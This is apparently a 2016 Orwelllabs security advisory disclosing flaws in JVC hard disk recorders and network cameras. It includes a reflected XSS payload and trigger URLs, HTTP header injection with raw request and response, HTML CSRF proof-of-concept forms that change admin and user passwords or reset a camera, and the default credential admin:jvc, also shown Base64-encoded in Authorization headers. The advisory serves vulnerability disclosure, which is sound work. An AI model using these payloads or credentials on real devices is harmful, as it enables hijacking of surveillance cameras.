@@ -1,0 +1,335 @@
+                      | | |       |
+  _ \  _|\ \  \ / -_) | | |  _` |  _ \(_-<
+\___/_|   \_/\_/\___|_|_|_|\__,_|_.__/___/
+
+www.orwelllabs.com
+security advisory
+      olsa-2016-04-01
+
+
+
+
+* Adivisory Information
++++++++++++++++++++++++
+(+) Title: JVC Multiple Products Multiple Vulnerabilities
+(+) Vendor: JVC Professional Video
+(+) Research and Advisory: Orwelllabs
+(+) Adivisory URL:
+http://www.orwelllabs.com/2016/04/jvc-multiple-products-multiple.html
+(+) OLSA-ID: OLSA-2016-04-01
+(+) Affected Products: JVC HDR VR-809/816, Network cameras VN-C*, VN-V*,
+VN-X* with firmwares 1.03 and 2.03
+(+) IoT Attack Surface: Device Administrative Interface
+(+) Owasp IoTTop10: I1, I2
+
+
+
+* Overview
+++++++++++
+I1 - 1. Multiple Cross-site Scripting
+I1 - 2. HTTP Header Injection
+I1 - 3. Multiple Cross-site Request Forgery
+I1 - 4. Cleartext sensitive data
+I1 - 5. Weak Default Credentials/Known credentials
+I2 - 6. Poorly Protected Credentials
+
+
+
+1. Reflected Cross-site scripting
+=================================
+JVC Hard Disk Recorders are prone to XSS and HTTP Header Injection[2].
+
+(+) Affected Products:
+----------------------
+JVC VR-809 HDR
+JVC VR-816 HDR
+
+
+(+) Technical Details/PoCs
+--------------------------
+
+(+) URL Trigger:
+http://xxx.xxx.xxx.xxx/api/param?video.input(01).comment&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
+
+(+) Payload used [ *** XSS *** ]: <img src=a onerror=alert("0rwelll4bs")>
+(+) affected script/path: /api/param?
+(+) affected parameters (video.input.COMMENT):
+
++ video.input(01).comment[ *** XSS *** ]
++ video.input(02).comment[ *** XSS *** ]
++ video.input(03).comment[ *** XSS *** ]
++ video.input(04).comment[ *** XSS *** ]
++ video.input(05).comment[ *** XSS *** ]
++ video.input(06).comment[ *** XSS *** ]
++ video.input(07).comment[ *** XSS *** ]
++ video.input(08).comment[ *** XSS *** ]
++ video.input(09).comment[ *** XSS *** ]
+
+(+) affected parameters (video.input.STATUS):
+
++ video.input(01).status[ *** XSS *** ]
++ video.input(02).status[ *** XSS *** ]
++ video.input(03).status[ *** XSS *** ]
++ video.input(04).status[ *** XSS *** ]
++ video.input(05).status[ *** XSS *** ]
++ video.input(06).status[ *** XSS *** ]
++ video.input(07).status[ *** XSS *** ]
++ video.input(08).status[ *** XSS *** ]
++ video.input(09).status[ *** XSS *** ]
+
+
+(+) URL Trigger:
+http://xxx.xxx.xxx.xxx/api/param?network.interface(01).dhcp.status[ *** XSS
+***]
+(+) affected parameters:
++ interface(01).dhcp.status[ *** XSS *** ]
+
+* In fact the javascript can be triggered just requesting the '/api/param?'
+directly with payload, like this:
+
+(+) URL: http://xxx.xxx.xxx.xxx/api/param?[*** XSS *** ]
+
+
+2. HTTP Header Injection
+========================
+The value of the "video.input(X).comment/status" request parameter is
+copied into the 'X-Response' response header.
+So the malicious payload submitted in the parameter generates a response
+with an injected HTTP header.
+
+
+> If you request the following URL with an Javascript Payload "[*** XSS
+***]":
+
+http://xxx.xxx.xxx.xxx/api/param?video.input(01).comment<img src=a
+onerror=alert("XSS")>&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
+
+> It will gennerate the GET request bellow:
+
+GET /api/param?video.input(01).comment<img src=a
+onerror=alert("XSS")>&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
+HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://xxx.xxx.xxx.xxx/
+Cookie: vrtypename=Hard%20Disk%20Recorder; vrmodelname=0rw3|||4bs
+Authorization: Basic YWRtaW46anZj
+Connection: keep-alive
+
+> And we'll get the response from the server:
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 564
+X-Response: video.input(01).comment<img src=a
+onerror=alert("XSS")>&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
+Cache-control: no-cache
+Pragma: no-cache
+Expires: Thu, 05 May 2016 14:20:45 GMT
+Server: JVC VR-809/816 API Server/1.0.0
+Date: Thu, 05 May 2016 14:20:45 GMT
+
+The javascript payload will be inject in X-Response response Header field
+
+
+3. Multiple Cross-site Request Forgery
+======================================
+Multiple products from JVC are prone to CSRF.
+
+(+) Affected Products:
+----------------------
+The following products with firmware versions 1.03, 2.03 and early:
+
+VN-C2WU
+VN-C3U
+VN-C1U
+VN-C2U
+VN-C3WU
+VN-A1U
+VN-C10U
+VN-C11U
+VN-C655U
+VN-C625U
+VN-C205U
+VN-C215V4U
+VN-C215VP4U
+VN-V686U
+VN-V686WPU
+VN-V25U
+VN-V26U
+VN-X35U
+VN-V685U
+VN-V686WPBU
+VN-X235VPU
+VN-V225VPU
+VN-X235U
+VN-V225U
+VN-V17U
+VN-V217U
+VN-V217VPU
+VN-H157WPU
+VN-T16U
+VN-T216VPRU
+
+
+(+) Technical Details/PoCs
+--------------------------
+
+> CSRF: to change 'admin' password to 'sm!thW'
+
+<html>
+ <!-- Orwelllabs - JVC NetCams CSRF PoC -->
+  <body>
+    <form action="http://xxx.xxx.xxx.xxx/cgi-bin/c20setup.cgi"
+method="POST">
+      <input type="hidden" name="c20loadhtml"
+value="c20systempassword&#46;html" />
+      <input type="hidden" name="usermode" value="admin" />
+      <input type="hidden" name="newpassword" value="sm!thW" />
+      <input type="hidden" name="new2password" value="sm!thW" />
+      <input type="hidden" name="ok" value="OK" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+> CSRF: to set 'user' password to "w!nst0nSm!th"
+
+<html>
+ <!-- Orwelllabs - JVC NetCams CSRF PoC -->
+  <body>
+    <form action="http://xxx.xxx.xxx.xxx/cgi-bin/c20setup.cgi"
+method="POST">
+      <input type="hidden" name="c20loadhtml"
+value="c20systempassword&#46;html" />
+      <input type="hidden" name="usermode" value="user" />
+      <input type="hidden" name="newpassword" value="w!nst0nSm!th" />
+      <input type="hidden" name="new2password" value="w!nst0nSm!th" />
+      <input type="hidden" name="ok" value="OK" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+> CSRF: to reinitialize the cam
+
+<html>
+  <!-- Orwelllabs - JVC NetCams CSRF PoC -->
+  <body>
+    <form action="http://xxx.xxx.xxx.xxx/cgi-bin/c20setup.cgi"
+method="POST">
+      <input type="hidden" name="c20loadhtml"
+value="c20systemmainte&#46;html" />
+      <input type="hidden" name="init" value="Initialize" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+4. Cleartext sensitive data
+===========================
+By default everything is trasmite over HTTP, including credentials.
+
+
+5. Weak Default Credentials/Known credentials
+=============================================
+The vast maiority of these devices remain with default credential admin:jvc
+or admin:[model-of-camera] and costumers are not obligated to change it
+during initial setup.
+
+
+6. Poorly Protected Credentials
+===============================
+An attacker in the same network is able to capture and decode the
+credentials as they aren't trasmited over HTTPs and are protected using
+just
+Base64 with Basic Authorization.
+
+> Authentication process
+
+GET /cgi-bin/x35viewing.cgi?x35ptzviewer.html HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: X35JPEGVIEWSIZE=VGA; X35JPEGDISP=OFF-OFF-OFF-OFF-1;
+X35JPEGSTREAM=HTTP-5-225.0.1.1-49152; X35JPEGHTTPPORT=80;
+X35FOLDERNAME=VN-X35; X35MPEG4VIEWSIZE=VGA; X35MPEG4DISP=OFF-OFF-OFF-1;
+X35MPEG4STREAM=HTTP-225.0.2.1-59152; X35MPEG4HTTPPORT=80;
+X35AUDIO=OFF-HTTP-225.0.3.1-39152-49298-80; X35PTZCTRL=w!nst0nSm!th
+Connection: keep-alive
+Authorization: Basic YWRtaW46anZj
+
+
+*Once this is related with a old bad design is possible that a large range
+of products are affected by reported issues.
+
+
+Timeline
+++++++++
+2016-04-20: First attemp to contact Vendor
+2016-04-22: Vendor asks for products affected/details sent
+2016-04-26: Ask vendor for any news about the issues reported
+2016-05-09: Until this date no response
+2016-05-10: Full disclosure
+
+
+Legal Notices
++++++++++++++
+The information contained within this advisory and in any other published
+by our lab is supplied "as-is" with no warranties or guarantees of fitness
+of use or otherwise.
+I accept no responsibility for any damage caused by the use or misuse of
+this information.
+
+
+About Orwelllabs
+++++++++++++++++
+Orwelllabs is an independent security research lab interested in IoT, what
+means embedded devices and all its components like web applications,
+network, mobile applications and all surface areas prone to attack.
+Orwelllabs aims to study, learn and produce some intelligence around this
+vast and confusing big picture called smart cities. We have special
+appreciation for devices designed to provide security to these highly
+technological cities, also known as Iost (Internet of Security Things ).
+
+
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
+xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
+xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
+55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
+U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
+SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
+d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
+AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
+Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
+f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
+pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
+LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
+95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
+AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
+ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
+gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
+tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
+6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
+TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
+DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
+MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
+Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
+FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
+I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
+C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
+=IZYl
+-----END PGP PUBLIC KEY BLOCK-----
